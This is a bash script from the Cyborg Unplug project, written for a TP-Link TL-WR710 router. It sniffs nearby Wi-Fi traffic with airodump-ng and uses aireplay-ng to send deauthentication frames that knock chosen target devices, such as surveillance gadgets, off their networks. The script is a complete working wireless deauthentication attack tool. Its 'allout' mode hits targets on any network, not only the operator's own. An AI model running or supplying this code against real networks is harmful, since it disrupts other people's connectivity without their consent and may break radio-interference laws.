#!/bin/bash

# Cyborg Unplug detector script for the TL-WR710. Detects and de-auths
# use-selected target devices. 
# 
# Copyright (C) 2015 Julian Oliver 
# 
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

shopt -s nocasematch # Important

LOGS=/www/logs/
CAPDIR=/tmp
CONFIG=/www/config
POLLTIME=10 # Seconds we wait for capture to find STA/BSSID pairs
DROPTIME=20 # Seconds we wait for a previously seen target to re-appear before dropping it
FRAMES=10 # Number of de-auth frames to send. 10 a good hit/time tradeoff
NETWORKS='' # Placeholder. Technically redundant.

# Read in the user selected target devices and build the target string.
SRCT=$(cat /www/config/targets | cut -d "," -f 2)
TARGETS='@('$(echo $SRCT | sed 's/\ /\*\|/g')'*)'

# Reload WiFi module, cheap memory flush
rmmod ath9k
insmod ath9k

# Set to station mode (taking down 'hostapd') so that we have control of the NIC
uci set wireless.@wifi-iface[0].mode="sta"
uci commit wireless
wifi up
sleep 1 # Important

# Extract and define a variable for our wireless NIC and bring it up in Monitor
# mode. We use $NIC to capture rather than the mon0 device created below. This
# is useful as we can set the channel of $NIC on the fly with iwconfig,
# automatically setting the channel of the mon0 device used to de-auth in turn.
NIC=$(iw dev | grep Interface | awk '{ print $2 }')
ifconfig $NIC down
iwconfig $NIC mode Monitor
ifconfig $NIC up

# Create a monitor device for aireplay-ng to de-auth with. Aireplay will only
# work with an airmon-ng mon device, not $NIC.
airmon-ng stop mon0 && airmon-ng start $NIC 
sleep 2

killall screen
#killall airodump-ng
rm -f $LOGS/detected
rm -f $CAPDIR/cap*.csv 

# Make the activity page the default site page for connections during detection
# (only available over Ethernet) 
cp /www/active.php /www/index.php

deauth() {
    echo "Target found."
    # Pause airodump-ng
    killall -STOP airodump-ng 
    # We can set the channel of $NIC and mon0 at once as $NIC is in Monitor mode
    iwconfig $NIC channel $SETCHANNEL
    sleep 1
    # Log this for the report page
    echo $(date) "de-authed" $STA "on" $BSSID >> $LOGS/detected
    # Do the de-auth
    echo "De-authing: " "$STA" " from " "$BSSID"
    aireplay-ng -0 $FRAMES -a $BSSID -c $STA mon0 
    # Resume airodump-ng
    killall -CONT airodump-ng 
    # Reset MAC vars 
    STA=ff:ff:ff:ff:ff:ff
    BSSID=ff:ff:ff:ff:ff:ff
}

MODE=$(cat $CONFIG/mode) 

case "$MODE" in 
    *territory*)
        # Override channels with those of target BSSIDs
        # Have to call awk twice as need to 'sort -u' for uniqueness first. Fix this.
        CHANNELS=$(cat /www/config/networks | sort -u | awk 'BEGIN { FS = "," }; { print $NF }' | sort -u | awk '{ print $0 }' ORS=',' | sed 's/,$//')
        echo "These are the networks we're watching"
        cat /www/config/networks
        # Read in the networks we're watching and build the target string. 
        SRCN=$(cat /www/config/networks | cut -d "," -f 1)
        NETWORKS='@('$(echo $SRCN | sed 's/\ /\|/g')')'
        # Screen is handy when debugging and needing to log in and live monitor
        # the airodump-ng output. It adds no overhead so left in.
        screen -Adm airodump-ng -a --output-format csv -c $CHANNELS -w $CAPDIR/cap $NIC
        #airodump-ng --output-format csv -c $CHANNELS -w $CAPDIR/cap $NIC
    ;;
    *alarm*)
        # airodump-ng will do a random walk of channels on its own
        screen -Adm airodump-ng -a --output-format csv -w $CAPDIR/cap $NIC
        #airodump-ng --output-format csv -w $CAPDIR/cap $NIC
    ;;
    *allout*)
        screen -Adm airodump-ng -a --output-format csv -w $CAPDIR/cap $NIC
        #airodump-ng --output-format csv -w $CAPDIR/cap $NIC
    ;;
    *)                    
esac

echo "This is our target list: "$TARGETS > $LOGS/targets

while true;
        do
            echo "//------------------------------------------------------->"
            sleep $POLLTIME
            echo "Sleeping for " $POLLTIME " and writing capture log"
            
            # Sort associated clients into temporary pairing files. Channels are
            # not in the probed/association section of airodump-ng and so the
            # pairs need to be extraced and matched separately.
            cat $CAPDIR/cap*.csv | awk '/Key/ {flag=1;next} /Station/{flag=0} flag {print $1 " " $6}' | sed -e 's/,//g' | sort -u > $CAPDIR/channels 
            cat $CAPDIR/cap*.csv | sed '1,/Probed/d'| awk '{ print $1 " " $8 " " $4 " " $5}' | sed -e 's/,//g' -e '/not/d' | sort -u > $CAPDIR/pairs 
            echo "<-------------------------------------------------------//"
            if [ -f $CAPDIR/pairs ]; then
                echo "These are our association pairs"
                cat $CAPDIR/pairs
            else
                echo "No association pairs found so far"
            fi
            echo "//------------------------------------------------------->"
            if [ -f $CAPDIR/pairs ]; then
                     while read line;
                             do
                                STA=$(echo $line | cut -d " " -f 1)
                                BSSID=$(echo $line | cut -d " " -f 2)

                                # airodump-ng's '--berlin' flag seems to have no
                                # impact on the CSV, so time delta must be
                                # calculated on 'last seen' field.  We use
                                # seconds since Epoch:
                                T=$(date "+%s")

                                if [[ "$STA" == $TARGETS && "$BSSID" == $NETWORKS && "$MODE" == "territory" ]]; then
                                        LASTT=$(date -d "$(echo $line | cut -d " " -f 3,4)" "+%s")
                                        let "DELTA=$T - $LASTT"
                                        echo $DELTA "for mode" $TERRITORY "and target" $STA
                                        if [ $DELTA -lt $DROPTIME ]; then
                                            SETCHANNEL=$(cat $CONFIG/networks | grep -i $BSSID | awk 'BEGIN { FS = "," }; { print $NF }')
                                            deauth
                                        fi
                                elif [[ ( "$STA" == $TARGETS || "$BSSID" == $TARGETS ) && "$MODE" == "allout" ]]; then
                                        LASTT=$(date -d "$(echo $line | cut -d " " -f 3,4)" "+%s")
                                        let "DELTA=$T - $LASTT"
                                        if [ $DELTA -lt $DROPTIME ]; then
                                            SETCHANNEL=$(cat $CAPDIR/channels | grep -i $BSSID | awk '{ print $2 }') 
                                            deauth
                                        fi
                                elif [[ "$MODE" == "alarm" ]]; then 
                                        LASTT=$(date -d "$(echo $line | cut -d " " -f 3,4)" "+%s")
                                        let "DELTA=$T - $LASTT"
                                        if [ $DELTA -lt $DROPTIME ]; then
                                            echo $(date) "detected" $STA "on" $BSSID >> $LOGS/detected
                                        fi
                                else
                                    # Remove redirect during debugging
                                    echo "No targets detected this pair for mode:" $MODE > /dev/null 
                                fi
                         done < $CAPDIR/pairs
                         echo "Removing temporary files and waiting for capture."
                         rm -f $CAPDIR/pairs $CAPDIR/channels 
                         echo "<-------------------------------------------------------//"
                    fi
done
